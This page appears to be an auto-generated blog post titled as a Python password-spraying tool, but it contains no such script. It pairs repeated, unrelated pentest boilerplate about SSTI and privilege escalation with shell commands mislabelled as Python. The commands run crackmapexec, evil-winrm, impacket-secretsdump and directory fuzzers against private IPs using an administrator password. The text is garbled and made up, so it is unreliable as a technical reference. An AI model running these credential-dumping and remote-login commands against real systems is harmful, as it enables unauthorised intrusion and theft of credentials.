---
TitleSEO: "Password Spraying Tool in Python | ZureFX"
TitlePost: "Password Spraying Tool — Python"
Author: "ZureFX"
Description: "A Python script for password spraying tool. Built for security research and automation."
Keywords: "powershell, bash, parser, tool, python, c"
URL: "https://zurefx.github.io/scripting/script-password-spraying-tool-696.html"
URL_IMAGES: ""
Date: "2025-01-23"
Tags: "PowerShell, Bash, Parser, Tool, Python, C"
Section: "scripting"
Lang: "en"
main_img: "script-password-spraying-tool-696"
Permalink: "/scripting/script-password-spraying-tool-696.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `john`
- `evil-winrm`
- `impacket`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. Lateral movement was facilitated by reusing discovered credentials across services.

```python
crackmapexec smb 10.126.105.90 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```python
evil-winrm -i 10.88.194.117 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.61.61.180
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.72.221.94/FUZZ
crackmapexec smb 10.68.248.110 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.45.178.47/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
crackmapexec smb 10.92.87.243 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.25.167
nmap -sCV -p5985,445,8080 10.11.73.55 -oN scan.txt
```

## Output

### Example Output

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 10.54s
```
